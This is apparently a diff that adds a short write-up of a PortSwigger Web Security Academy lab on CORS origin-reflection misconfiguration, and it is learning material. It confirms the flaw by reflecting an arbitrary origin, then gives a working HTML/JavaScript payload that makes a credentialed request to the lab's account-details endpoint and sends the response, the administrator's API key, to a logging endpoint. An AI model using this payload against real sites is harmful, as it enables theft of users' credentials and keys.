@@ -1,0 +1,31 @@
+                 
+                    1. CORS vulnerability with basic origin reflection
+
+Target :- exploit the cors misconfig to retrive administrator api key
+
+Testing for cors misconfig :-
+i) change the origin to an arbitary value => true
+   it respondes with Access-Control-Allow-Origin:http://our-website.com
+                     Access-Control-Allow-Credentials:true
+
+ hence there is vulnerability
+
+PAYLOAD :- 
+
+<html>
+    <body>
+        <h1>You have been hacked !!!</h1>
+       <script>
+           var xhr = new XMLHttpRequest();
+           var url = "https://0a560086037b197e811c6103001100b1.web-security-academy.net";
+           xhr.onreadystatechange = function(){
+            if(xhr.readyState == XMLHttpRequest.DONE){
+                fetch("/log?key="+xhr.responseText)
+            }
+           }
+           xhr.open('GET',url+"/accountDetails",true)
+           xhr.withCredentials=true;
+           xhr.send(null);
+       </script>        
+    </body>
+</html>
